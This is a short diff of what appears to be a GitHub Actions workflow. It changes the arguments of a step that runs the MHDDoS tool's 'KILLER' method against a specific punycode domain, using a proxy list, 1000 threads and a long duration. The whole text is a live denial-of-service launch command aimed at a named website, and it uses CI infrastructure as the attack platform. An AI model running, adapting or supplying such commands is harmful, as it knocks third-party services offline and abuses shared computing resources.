@@ -27,4 +27,4 @@ jobs:
 
     - name: Run MHDDoS Tool
       run: |
-        python3 MHDDoS/start.py KILLER https://xn--mgbfb0a3b7d15c.com 4 1000 proxyy.txt 21000
+        python3 MHDDoS/start.py KILLER https://xn--mgbfb0a3b7d15c.com 4 1000 proxyy.txt 100 21000
